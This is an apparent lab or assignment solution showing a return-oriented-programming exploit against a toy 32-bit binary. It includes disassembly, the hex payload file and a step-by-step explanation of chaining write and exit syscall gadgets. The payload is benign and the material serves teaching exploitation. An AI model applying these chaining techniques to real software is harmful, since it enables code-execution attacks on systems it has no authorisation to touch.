@@ -1,0 +1,295 @@
+*******************************************************************************
+* CODE DUMP *******************************************************************
+*******************************************************************************
+080484c0 <main>:
+ 80484c0:       55                      push   ebp
+ 80484c1:       89 e5                   mov    ebp,esp
+ 80484c3:       83 ec 10                sub    esp,0x10
+ 80484c6:       68 28 a0 04 08          push   0x804a028
+ 80484cb:       e8 90 fe ff ff          call   8048360 <printf@plt>
+ 80484d0:       68 68 a0 04 08          push   0x804a068
+ 80484d5:       e8 86 fe ff ff          call   8048360 <printf@plt>
+ 80484da:       68 f3 a0 04 08          push   0x804a0f3
+ 80484df:       e8 7c fe ff ff          call   8048360 <printf@plt>
+ 80484e4:       83 c4 0c                add    esp,0xc
+ 80484e7:       68 07 a1 04 08          push   0x804a107
+ 80484ec:       68 ff a0 04 08          push   0x804a0ff
+ 80484f1:       e8 aa fe ff ff          call   80483a0 <fopen@plt>
+ 80484f6:       83 c4 08                add    esp,0x8
+ 80484f9:       85 c0                   test   eax,eax
+ 80484fb:       74 29                   je     8048526 <done>
+ 80484fd:       89 45 fc                mov    DWORD PTR [ebp-0x4],eax
+ 8048500:       81 ec 00 01 00 00       sub    esp,0x100
+ 8048506:       89 e1                   mov    ecx,esp
+ 8048508:       50                      push   eax                    ; FILE*
+ 8048509:       68 00 01 00 00          push   0x100                  ; nmemb
+ 804850e:       6a 01                   push   0x1                    ; size
+ 8048510:       51                      push   ecx                    ; Buffer
+ 8048511:       e8 6a fe ff ff          call   8048380 <fread@plt>
+ 8048516:       83 c4 10                add    esp,0x10
+ 8048519:       c3                      ret
+ 804851a:       8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
+ 804851d:       50                      push   eax
+ 804851e:       e8 4d fe ff ff          call   8048370 <fclose@plt>
+ 8048523:       83 c4 04                add    esp,0x4
+
+08048526 <done>:
+ 8048526:       83 c4 10                add    esp,0x10
+ 8048529:       5d                      pop    ebp
+ 804852a:       c3                      ret
+
+0804852b <printOut>:
+ 804852b:       55                      push   ebp
+ 804852c:       89 e5                   mov    ebp,esp
+ 804852e:       56                      push   esi
+ 804852f:       53                      push   ebx
+ 8048530:       b8 04 00 00 00          mov    eax,0x4
+ 8048535:       8b 1c 24                mov    ebx,DWORD PTR [esp]
+ 8048538:       8b 4c 24 04             mov    ecx,DWORD PTR [esp+0x4]
+ 804853c:       8b 54 24 08             mov    edx,DWORD PTR [esp+0x8]
+ 8048540:       cd 80                   int    0x80
+ 8048542:       5b                      pop    ebx
+ 8048543:       5e                      pop    esi
+ 8048544:       5d                      pop    ebp
+ 8048545:       c3                      ret
+ 8048546:       66 90                   xchg   ax,ax
+ 8048548:       66 90                   xchg   ax,ax
+ 804854a:       66 90                   xchg   ax,ax
+ 804854c:       66 90                   xchg   ax,ax
+ 804854e:       66 90                   xchg   ax,ax
+
+
+
+
+
+ *******************************************************************************
+ * DATA DUMP *******************************************************************
+ *******************************************************************************
+ Disassembly of section .data:
+
+ 0804a020 <__data_start>:
+  804a020:	00 00                	add    BYTE PTR [eax],al
+ 	...
+
+ 0804a024 <__dso_handle>:
+  804a024:	00 00                	add    BYTE PTR [eax],al
+ 	...
+
+ 0804a028 <welcome>:
+  804a028:	48                   	dec    eax
+  804a029:	65 6c                	gs ins BYTE PTR es:[edi],dx
+  804a02b:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a02c:	6f                   	outs   dx,DWORD PTR ds:[esi]
+  804a02d:	20 77 6f             	and    BYTE PTR [edi+0x6f],dh
+  804a030:	72 6c                	jb     804a09e <goal+0x36>
+  804a032:	64 21 20             	and    DWORD PTR fs:[eax],esp
+  804a035:	57                   	push   edi
+  804a036:	65 6c                	gs ins BYTE PTR es:[edi],dx
+  804a038:	63 6f 6d             	arpl   WORD PTR [edi+0x6d],bp
+  804a03b:	65 20 74 6f 20       	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
+  804a040:	74 68                	je     804a0aa <goal+0x42>
+  804a042:	65 20 52 4f          	and    BYTE PTR gs:[edx+0x4f],dl
+  804a046:	50                   	push   eax
+  804a047:	20 61 73             	and    BYTE PTR [ecx+0x73],ah
+  804a04a:	73 65                	jae    804a0b1 <goal+0x49>
+  804a04c:	6d                   	ins    DWORD PTR es:[edi],dx
+  804a04d:	62 6c 79 20          	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
+  804a051:	70 72                	jo     804a0c5 <goal+0x5d>
+  804a053:	6f                   	outs   dx,DWORD PTR ds:[esi]
+  804a054:	67 72 61             	addr16 jb 804a0b8 <goal+0x50>
+  804a057:	6d                   	ins    DWORD PTR es:[edi],dx
+  804a058:	6d                   	ins    DWORD PTR es:[edi],dx
+  804a059:	69 6e 67 20 63 68 61 	imul   ebp,DWORD PTR [esi+0x67],0x61686320
+  804a060:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a061:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a062:	65 6e                	outs   dx,BYTE PTR gs:[esi]
+  804a064:	67 65 0a 00          	or     al,BYTE PTR gs:[bx+si]
+
+ 0804a068 <goal>:
+  804a068:	59                   	pop    ecx
+  804a069:	6f                   	outs   dx,DWORD PTR ds:[esi]
+  804a06a:	75 20                	jne    804a08c <goal+0x24>
+  804a06c:	67 6f                	outs   dx,DWORD PTR ds:[si]
+  804a06e:	61                   	popa
+  804a06f:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a070:	20 69 73             	and    BYTE PTR [ecx+0x73],ch
+  804a073:	20 74 6f 20          	and    BYTE PTR [edi+ebp*2+0x20],dh
+  804a077:	73 65                	jae    804a0de <goal+0x76>
+  804a079:	74 75                	je     804a0f0 <goal+0x88>
+  804a07b:	70 20                	jo     804a09d <goal+0x35>
+  804a07d:	61                   	popa
+  804a07e:	20 52 4f             	and    BYTE PTR [edx+0x4f],dl
+  804a081:	50                   	push   eax
+  804a082:	20 63 68             	and    BYTE PTR [ebx+0x68],ah
+  804a085:	61                   	popa
+  804a086:	69 6e 20 74 68 61 74 	imul   ebp,DWORD PTR [esi+0x20],0x74616874
+  804a08d:	20 77 69             	and    BYTE PTR [edi+0x69],dh
+  804a090:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a091:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a092:	20 70 72             	and    BYTE PTR [eax+0x72],dh
+  804a095:	69 6e 74 20 22 52 4f 	imul   ebp,DWORD PTR [esi+0x74],0x4f522220
+  804a09c:	50                   	push   eax
+  804a09d:	20 69 73             	and    BYTE PTR [ecx+0x73],ch
+  804a0a0:	20 6e 6f             	and    BYTE PTR [esi+0x6f],ch
+  804a0a3:	20 6c 75 63          	and    BYTE PTR [ebp+esi*2+0x63],ch
+  804a0a7:	6b 21 22             	imul   esp,DWORD PTR [ecx],0x22
+  804a0aa:	20 74 6f 20          	and    BYTE PTR [edi+ebp*2+0x20],dh
+  804a0ae:	74 68                	je     804a118 <__TMC_END__+0xc>
+  804a0b0:	65 20 63 6f          	and    BYTE PTR gs:[ebx+0x6f],ah
+  804a0b4:	6d                   	ins    DWORD PTR es:[edi],dx
+  804a0b5:	6d                   	ins    DWORD PTR es:[edi],dx
+  804a0b6:	61                   	popa
+  804a0b7:	6e                   	outs   dx,BYTE PTR ds:[esi]
+  804a0b8:	64 20 6c 69 6e       	and    BYTE PTR fs:[ecx+ebp*2+0x6e],ch
+  804a0bd:	65 20 66 6f          	and    BYTE PTR gs:[esi+0x6f],ah
+  804a0c1:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a0c2:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a0c3:	6f                   	outs   dx,DWORD PTR ds:[esi]
+  804a0c4:	77 65                	ja     804a12b <__TMC_END__+0x1f>
+  804a0c6:	64 20 62 79          	and    BYTE PTR fs:[edx+0x79],ah
+  804a0ca:	20 61 6e             	and    BYTE PTR [ecx+0x6e],ah
+  804a0cd:	6f                   	outs   dx,DWORD PTR ds:[esi]
+  804a0ce:	74 68                	je     804a138 <__TMC_END__+0x2c>
+  804a0d0:	65 72 20             	gs jb  804a0f3 <luck>
+  804a0d3:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a0d4:	69 6e 65 20 73 61 79 	imul   ebp,DWORD PTR [esi+0x65],0x79617320
+  804a0db:	69 6e 67 20 22 52 4f 	imul   ebp,DWORD PTR [esi+0x67],0x4f522220
+  804a0e2:	50                   	push   eax
+  804a0e3:	20 69 73             	and    BYTE PTR [ecx+0x73],ch
+  804a0e6:	20 6f 6e             	and    BYTE PTR [edi+0x6e],ch
+  804a0e9:	6c                   	ins    BYTE PTR es:[edi],dx
+  804a0ea:	79 20                	jns    804a10c <__TMC_END__>
+  804a0ec:	77 6f                	ja     804a15d <__TMC_END__+0x51>
+  804a0ee:	72 6b                	jb     804a15b <__TMC_END__+0x4f>
+  804a0f0:	22 0a                	and    cl,BYTE PTR [edx]
+ 	...
+
+ 0804a0f3 <luck>:
+  804a0f3:	47                   	inc    edi
+  804a0f4:	6f                   	outs   dx,DWORD PTR ds:[esi]
+  804a0f5:	6f                   	outs   dx,DWORD PTR ds:[esi]
+  804a0f6:	64 20 6c 75 63       	and    BYTE PTR fs:[ebp+esi*2+0x63],ch
+  804a0fb:	6b 21 0a             	imul   esp,DWORD PTR [ecx],0xa
+ 	...
+
+ 0804a0ff <file>:
+  804a0ff:	72 6f                	jb     804a170 <__TMC_END__+0x64>
+  804a101:	70 2e                	jo     804a131 <__TMC_END__+0x25>
+  804a103:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
+ 	...
+
+ 0804a107 <mode>:
+  804a107:	72 62                	jb     804a16b <__TMC_END__+0x5f>
+ 	...
+
+
+
+
+*******************************************************************************
+* EXPLANATION *****************************************************************
+*******************************************************************************
+First, start by analyzing how the binary reads the file using the "fread"
+function.  We start the analysis at addr 0x08048500, anything above in main is
+simply to print out the instructions in the console with "printf".
+
+1. Starts off by allocating 0x100 bytes on the stack (local buffer).
+2. Pushes the params for fread:
+   (FILE* which was in eax)
+   (0x100, the number of units to read)
+   (0x01, units are 1 byte long)
+   (ecx, contains a ptr to the buffer where the file will be (esp - 0x100))
+3. Calls "fread"
+4. Adds 0x10 to the stack pointer (clears the 4 params)
+5. Calls return ??? <--- this is where we exploit.
+6. The ret instruction will return to the address pointed to by the stack
+   pointer register (esp).  Since we only added 0x10 to the stack pointer when
+   returning from the "fread" function, esp is actually pointing at the
+   beginning of the buffer where we read our file into.  This means that it's
+   pointing at the first byte of our binary fine.
+
+7. Here are the contents of the rop.bin file:
+00000000: 30850408 02000000 9aa00408 0f000000  0...............
+00000010: 30850408 02000000 f1a00408 01000000  0...............
+00000020: 30850408 02000000 e0a00408 10000000  0...............
+00000030: 30850408 02000000 f1a00408 01000000  0...............
+00000040: 42850408 00000000 deadbeef deadbeef  B...............
+00000050: 40850408 00000000 00000000 00000000  @...............
+
+That being said, the ret instruction at address 0x08048519 will return to
+0x08048530.
+
+This is the code of interest at that address:
+8048530:       b8 04 00 00 00          mov    eax,0x4
+8048535:       8b 1c 24                mov    ebx,DWORD PTR [esp]
+8048538:       8b 4c 24 04             mov    ecx,DWORD PTR [esp+0x4]
+804853c:       8b 54 24 08             mov    edx,DWORD PTR [esp+0x8]
+8048540:       cd 80                   int    0x80
+8048542:       5b                      pop    ebx
+8048543:       5e                      pop    esi
+8048544:       5d                      pop    ebp
+8048545:       c3                      ret
+
+This code calls interrupt 0x80 (system call 0x04 (in eax)) which is write
+(`man 2 write`) with the parameters that are laying around at esp, esp + 0x04
+and esp + 0x08. If you look at our rop.bin file, we have set:
+  esp to 0x02 (STD_ERR output)
+  esp + 0x04 to the address of the data section that we want to use as source
+    buffer for the write operation.  In this case, the address of the
+    "ROP is no luck!" string from the data segment.
+  esp + 0x08 is set to the number of bytes we wish to write to whatever file
+    descriptor number is in esp (in this case, STD_ERR) -- 15 in this case.
+
+After the `int 0x80` instruction is called, pop the next three values from stack
+into some registers (this is the equivalent to adding 0x0C to esp).
+
+Then, a ret instruction picks up whatever is in esp, which is now 0x08048530.
+The same address we started with.  So the next three values from the file are
+sensibly the same except we only write out 1 byte, a line feed (0x0A) found at
+address 0x0804a0f1 in the data segment.
+
+Third time around, ret instructions returns to 0x08048530 after the 3 previous
+values were poped from the stack.  Now, using the same technique described
+above, we print out the "ROP is only work" string.
+
+Fourth time around, same thing except we print out an other line feed (0x0A).
+
+Using ROP, the program actually outputs what we want!  The bad part? If we leave
+it like this, the stack is unballences (remember that sub esp, 0x100
+instruction?).  We never actually rebalance it to have a clean exit.
+
+To go the extra mile, there's a nice trick.  When doing a system call using the
+int 0x80 instruction, eax actually contains the return value of whatever system
+call we made.  In the case of the "write" system call (`man 2 write`), the
+return value is the number of bytes that were successfully written.  In our last
+case, we wrote out 1byte (the line feed).
+
+So, eax contains 0x01.  We also poped all thre parameters for the last "write"
+system call from the stack.  If we're actually able to do an other system call
+(int 0x80), we'll be executing system call 0x01 (that's the value of eax).
+System call 0x01 is "exit" (you see where I'm going don't you?).
+
+"exit" (`man 2 exit`) takes one parameter, the exit status.  After we're done
+calling "write" for the 4th time and poping the three values from the stack,
+we're at the ret instruction again.  This time, eax contains 0x01.  Also, the
+exit status (by system call convention) has to be in ebx when the int 0x80
+instruction is executed.
+
+If you look at the file, we're kind of clever.  After poping the three params of
+the "write" call, the return address found is 0x08048542, which will re-execute
+the three pop instructions.  Looking at the file, the three values getting poped
+into registers ebx, esi and ebp are respectively 0x00000000, 0xDEADBEEF and
+0xDEADBEEF (see the contents of the rop.bin file)
+
+By the time we're done poping and hit that ret instruction again, here is the
+status of our registers of interest:
+eax: 0x01
+ebx: 0x00
+esi: 0xDEADBEEF
+ebp: 0xDEADBEEF
+
+All we need now, call int 0x80, system call 0x01 (eax) with exit status 0x00
+ebx and we're done! Hence, the last value in the file (the last used from the
+stack), the address to the int 0x80 instruction: 0x08048540.
+
+We now have a working ROP that prints out whatever the assignment required AND
+a clean exiting program.
